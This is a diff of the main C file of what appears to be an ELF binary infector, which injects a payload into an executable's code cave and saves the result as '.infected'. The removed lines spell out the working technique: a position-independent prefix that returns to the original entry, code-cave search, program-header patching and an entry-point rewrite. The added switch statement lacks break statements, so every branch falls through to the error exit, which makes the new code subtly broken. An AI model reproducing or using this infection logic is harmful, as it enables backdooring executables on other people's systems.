@@ -13,17 +13,11 @@
 
 #include "min_max.h"
 #include "mem_search.h"
+#include "str_manip.h"
 #include "file_io.h"
 #include "elf_map.h"
-#include "str_manip.h"
+#include "inject.h"
 #include "help.h"
-
-#define CODE_CAVE_PADDING 8
-
-uint8_t payload_prefix[] = {
-    0x48, 0x8d, 0x05, 0xff, 0xff, 0xff, 0xff,   // lea  -0x1(%rip),%rax
-    0x50,                                       // push %rax
-};
 
 int main(int argc, char* argv[]) {
     if (argc < 3 || argc > 3) {
@@ -44,51 +38,33 @@ int main(int argc, char* argv[]) {
         exit_error("failed to load payload");
     }
 
-    elf64_map_t elf_map = map_elf64(map, map_size);
-    if (elf_map.start == NULL) {
+    if (!is_elf(map, map_size)) {
         (void)munmap(map, map_size);
         free(payload);
-        exit_error("failed to map ELF headers in target file");
+        exit_error("target file doesn't use the ELF format");
     }
 
-    Elf64_Phdr* executable_header = find_program_header(elf_map, PT_LOAD, PF_R | PF_X);
-    if (executable_header == NULL) {
-        (void)munmap(map, map_size);
-        free(payload);
-        exit_error("failed to find a suitable location for the payload");
+    switch (elf_class(map, map_size))
+    {
+        case ELFCLASS32:
+            if (inject32(map, map_size, payload, payload_size) == -1) {
+                (void)munmap(map, map_size);
+                free(payload);
+                exit_error("failed to find a suitable location for the payload");
+            }
+        case ELFCLASS64:
+            if (inject64(map, map_size, payload, payload_size) == -1) {
+                (void)munmap(map, map_size);
+                free(payload);
+                exit_error("failed to find a suitable location for the payload");
+            }
+        default:
+            (void)munmap(map, map_size);
+            free(payload);
+            exit_error("target file doesn't use the ELF format");
     }
-
-    uint8_t* code_cave = (uint8_t*)find_code_cave(
-        elf_map.start + executable_header->p_offset,
-        sizeof(payload_prefix) + payload_size,
-        umin(sizeof(payload_prefix) + payload_size + CODE_CAVE_PADDING * 2 + executable_header->p_filesz,
-        map_size - executable_header->p_offset),
-        CODE_CAVE_PADDING
-    );
-
-    if (code_cave == NULL) {
-        (void)munmap(map, map_size);
-        free(payload);
-        exit_error("failed to find a suitable location for the payload");
-    }
-
-    int offset = elf_map.header->e_entry - (code_cave - elf_map.start) - 7;
-
-    memcpy(payload_prefix + 3, &offset, 4);
-    memcpy(code_cave, payload_prefix, sizeof(payload_prefix));
-    memcpy(code_cave + sizeof(payload_prefix), payload, payload_size);
 
     free(payload);
-
-    executable_header->p_filesz = umax(
-        executable_header->p_filesz,
-        (code_cave - elf_map.start) + sizeof(payload_prefix) + payload_size - executable_header->p_offset
-    );
-    executable_header->p_memsz = umax(
-        executable_header->p_memsz,
-        executable_header->p_filesz
-    );
-    elf_map.header->e_entry = code_cave - elf_map.start;
 
     char* out_file_name = str_join(basename(argv[1]), ".infected");
     if (out_file_name == NULL) {
